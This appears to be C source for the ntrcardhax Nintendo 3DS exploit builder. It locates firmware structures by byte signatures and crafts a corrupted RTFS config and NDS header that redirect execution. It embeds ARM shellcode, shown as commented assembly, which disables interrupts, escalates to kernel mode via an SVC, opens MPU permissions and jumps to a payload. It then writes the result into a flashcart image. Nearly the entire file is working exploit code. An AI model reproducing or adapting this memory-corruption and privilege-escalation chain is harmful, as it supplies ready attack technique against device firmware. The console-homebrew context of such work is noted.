/*
* Copyright (C) 2016 - Normmatt
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <cstring>
#include "ERTFS_types.h"
#include "firm.h"
#include "crc.h"

//	 ldr sp,=0x22140000
//	 
//	 ;Disable IRQ
//	 mrs r0, cpsr
//	 orr r0, #(1<<7)
//	 msr cpsr_c, r0
//	 
//	 adr r0, kernelmode
//	 swi 0x7B
//
//kernelmode:
//	 mov r2, #0x22
//	 msr CPSR_c, #0xDF
//	 ldr r3, =0x33333333 ;R/W
//	 mcr p15, 0, r3,c5,c0, 2
//	 mov r2, #0xCC
//	 mcr p15, 0, r3,c5,c0, 3
//	 ldr r0, =0x23F00000
//	 bx r0
unsigned char loader_bin[0x44] =
{
    0x30, 0xD0, 0x9F, 0xE5, 0x00, 0x00, 0x0F, 0xE1, 0x80, 0x00, 0x80, 0xE3, 0x00, 0xF0, 0x21, 0xE1,
    0x00, 0x00, 0x8F, 0xE2, 0x7B, 0x00, 0x00, 0xEF, 0x22, 0x20, 0xA0, 0xE3, 0xDF, 0xF0, 0x21, 0xE3,
    0x14, 0x30, 0x9F, 0xE5, 0x50, 0x3F, 0x05, 0xEE, 0xCC, 0x20, 0xA0, 0xE3, 0x70, 0x3F, 0x05, 0xEE,
    0x08, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0x14, 0x22, 0x33, 0x33, 0x33, 0x33,
    0x00, 0x00, 0xF0, 0x23,
};


uint32_t find_ntrcard_header_address(uint8_t *arm9bin, int arm9len)
{
    uint32_t headerAdr = -1;

    for(uint16_t *ii = (uint16_t *)arm9bin; ii < (uint16_t *)(arm9bin + arm9len); ++ii)
    {
        //7C B5               PUSH    {R2-R6,LR}
        //2C 4C               LDR     R4, =card_struct
        //05 00               MOVS    R5, R0
        //2A 48               LDR     R0, =ntrcard_header
        //26 00               MOVS    R6, R4
        if(0xB57C == *(ii) && 0x4C2C == *(ii + 1) && 0x0005 == *(ii + 2) && 0x482A == *(ii + 3) && 0x0026 == *(ii + 4))
        {
            headerAdr = *(uint32_t*)((uint8_t *)ii + 0xB0);
            break;
        }
    }

    return headerAdr;
}

uint32_t find_rtfs_cfg_address(uint8_t *arm9bin, int arm9len)
{
    uint32_t rtfs_cfg = -1;

    for(uint16_t *ii = (uint16_t *)arm9bin; ii < (uint16_t *)(arm9bin + arm9len); ++ii)
    {
        //10 B5               PUSH    {R4,LR}
        //0D 48               LDR     R0, =rtfs_cfg; dest
        //0D 4C               LDR     R4, =ERTFS_prtfs_cfg
        //FF 22 6D 32         MOVS    R2, #0x16C; len
        //00 21               MOVS    R1, #0; val
        //20 60               STR     R0, [R4]
        if(0xB510 == *(ii) && 0x480D == *(ii + 1) && 0x4C0D == *(ii + 2) && 0x22FF == *(ii + 3) && 0x326D == *(ii + 4) && 0x2100 == *(ii + 5) && 0x6020 == *(ii + 6))
        {
            rtfs_cfg = *(uint32_t*)((uint8_t *)ii + 0x38);
            break;
        }
    }

    return rtfs_cfg;
}

uint32_t find_rtfs_handle_address(uint8_t *arm9bin, int arm9len)
{
    uint32_t rtfs_handle = -1;

    for(uint16_t *ii = (uint16_t *)arm9bin; ii < (uint16_t *)(arm9bin + arm9len); ++ii)
    {
        //70 B5               PUSH    {R4-R6,LR}
        //0B 23               MOVS    R3, #0xB
        //0B 4A               LDR     R2, =rtfs_handle
        //00 21               MOVS    R1, #0
        //9B 01               LSLS    R3, R3, #6
        //C4 18               ADDS    R4, R0, R3
        if(0xB570 == *(ii) && 0x230B == *(ii + 1) && 0x4A0B == *(ii + 2) && 0x2100 == *(ii + 3) && 0x019B == *(ii + 4) && 0x18C4 == *(ii + 5))
        {
            rtfs_handle = *(uint32_t*)((uint8_t *)ii + 0x34) + 0x10;
            break;
        }
    }

    return rtfs_handle;
}

int main()
{
    firmCtx ctx9;
    uint8_t *payload = (uint8_t *)calloc(0x1000,1);
    RTFS_CFG rtfs_cfg = {};

    FILE *f1 = fopen("ak2i_flash81_ntrcardhax_template.bin", "rb");
    fseek(f1, 0, SEEK_END);
    int f1_size = ftell(f1);
    uint8_t *flash = (uint8_t *)malloc(f1_size);
    fseek(f1, 0, SEEK_SET);
    fread(flash, 1, f1_size, f1);
    fclose(f1);

    memcpy(payload, flash + 0x2000, 0x1000);

    firmOpen(&ctx9, "firm_2_08006800.bin");

    //int ntrHeaderAdr = 0x080E1CB4;
    int ntrHeaderAdr = find_ntrcard_header_address(firmGetData(&ctx9), firmGetSize(&ctx9));
    int rtfsCfgAdr = find_rtfs_cfg_address(firmGetData(&ctx9), firmGetSize(&ctx9));
    int rtfsHandleAdr = find_rtfs_handle_address(firmGetData(&ctx9), firmGetSize(&ctx9));
    int rtfsCfgAdrDiff = rtfsCfgAdr - ntrHeaderAdr;
    int rtfsCopyLen = sizeof(RTFS_CFG) - 0x2C; //Don't need full rtfs struct

    int wrappedAdr = (rtfsCfgAdrDiff) & 0xFFF;

    volatile int error = 0;

    if(ntrHeaderAdr == -1)
    {
        printf("Failed to locate ntrcard header address.\n");
        error = 1;
        goto exit;
    }

    if(rtfsCfgAdr == -1)
    {
        printf("Failed to locate rtfs cfg address.\n");
        error = 1;
        goto exit;
    }

    if(rtfsHandleAdr == -1)
    {
        printf("Failed to locate rtfs handle address.\n");
        error = 1;
        goto exit;
    }

    if((wrappedAdr >= 0x0) && (wrappedAdr <= 0x10)) //0x31C but some overlap is fine
    {
        printf("There is a conflict with the ntrcard header when wrapped... have fun fixing this! (%08X)\n", wrappedAdr);
        error = 1;
        goto exit;
    }

    if((wrappedAdr >= 0x2A8) && (wrappedAdr <= 0x314)) //0x31C but some overlap is fine
    {
        printf("There is a conflict with the rtfs struct when wrapped... have fun fixing this! (%08X)\n", wrappedAdr);
        error = 1;
        goto exit;
    }

    //Must be 1 to bypass some stuff
    rtfs_cfg.cfg_NFINODES = 1;

    //This is the address that gets overwritten
    //NF writes two u32s
    //[adr + 0] = 0x0000000B
    //[adr + 4] = 0x00000000
    rtfs_cfg.mem_region_pool = (struct region_fragment *)(ntrHeaderAdr + 0x4);

    for(int i = 0; i < 26; i++)
        rtfs_cfg.drno_to_dr_map[i] = (ddrive*)(ntrHeaderAdr + 0);

    //Copy rtfs_cfg into right place (taking into account wrapping)
    uint32_t* prtfs_cfg32 = (uint32_t*)&rtfs_cfg;
    for(int i = 0; i < rtfsCopyLen; i+=4) //Don't need full rtfs struct
    {
        wrappedAdr = (rtfsCfgAdrDiff + i) & 0xFFF;
        if((wrappedAdr >= 0x14) && (wrappedAdr <= 0x60))
        {
            printf("There is a conflict with the ntrcard header when wrapped... have fun fixing this! (%08X)\n", wrappedAdr);
            printf("%08X out of %08X copied.", i, rtfsCopyLen);
            if(i < 0xFC)
            {
                printf("This might not actually work because not enough buffers were overwritten correctly!");
                error = 1;
            }
            break;
        }
        *(uint32_t*)&payload[wrappedAdr] = prtfs_cfg32[i/4];
    }

    *(uint32_t*)&payload[0x2EC] = rtfsHandleAdr; //Some handle rtfs uses
    *(uint32_t*)&payload[0x2F0] = 0x41414141; //Bypass FAT corruption error
    *(uint32_t*)&payload[0x31C] = ntrHeaderAdr + 0x2A8; //This is the PC we want to jump to (from a BLX)

    memcpy(&payload[0x2A8], loader_bin, 0x44);

    //Fix nds header as this makes native firm respond properly
    uint16_t crc = CalcCrc(payload, 0x15E);
    *(uint16_t*)&payload[0x15E] = crc;

    FILE *f = fopen("ACEKv00.nds", "wb");
    fwrite(payload, 1, 0x1000, f);
    fclose(f);

    memcpy(flash + 0x2000, payload, 0x1000);

    FILE *f2 = fopen("ak2i_flash81_ntrcardhax.bin", "wb");
    fwrite(flash, 1, f1_size, f2);
    fclose(f2);

exit:
    free(flash);
    free(payload);
    free(firmGetData(&ctx9));

    while(error);
    return 0;
}

